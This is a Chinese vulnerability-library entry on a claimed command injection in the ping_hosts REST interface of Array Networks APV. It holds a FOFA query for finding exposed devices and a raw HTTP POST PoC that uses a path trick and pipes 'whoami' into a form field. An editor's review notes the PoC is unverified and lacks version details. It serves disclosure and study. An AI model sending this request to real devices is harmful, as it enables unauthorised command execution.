---
source: "wy876 漏洞文库"
id: "vw-369c7bee538e789208ce3e05"
entity_id: "ve-369c7bee538e789208ce3e05"
schema_version: "1"
title: "Array-Networks-APV应用交付系统ping_hosts存在任意命令执行漏洞"
product: "Array Networks APV"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "仅列Array APV，无版本；宣称未认证，样例带CSRF字段"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Array%20Networks/Array-Networks-APV%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%B3%BB%E7%BB%9Fping_hosts%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cvbg0a36xeft22g9"
source_status: "recorded"
---

# Array-Networks-APV应用交付系统ping_hosts存在任意命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Array Networks APV
- 本文讨论：ping_hosts命令注入
- 版本、权限与配置前提：仅列Array APV，无版本；宣称未认证，样例带CSRF字段
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 没有受影响固件、认证绕过与CSRF字段来源说明
- 无成功响应/可观察结果证据；HTTP报文误标java
- 仅转载来源，未有厂商/研究者公告
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- /restapi/../rest路径及字段在实际固件上的行为未验证
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Array Networks APV应用交付系统 /rest/ping_hosts 接口存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复.

# 二、影响版本
+ Array APV

# 三、资产测绘
+ fofa`app="Array-APV" && title=="Login"`
+ 特征


# 四、漏洞复现
```http
POST /restapi/../rest/ping_hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Length: 98

["127.0.0.1| echo `whoami` received 2 3 4"]=1&csrfmiddlewaretoken=cXL**************************dWW
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvbg0a36xeft22g9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
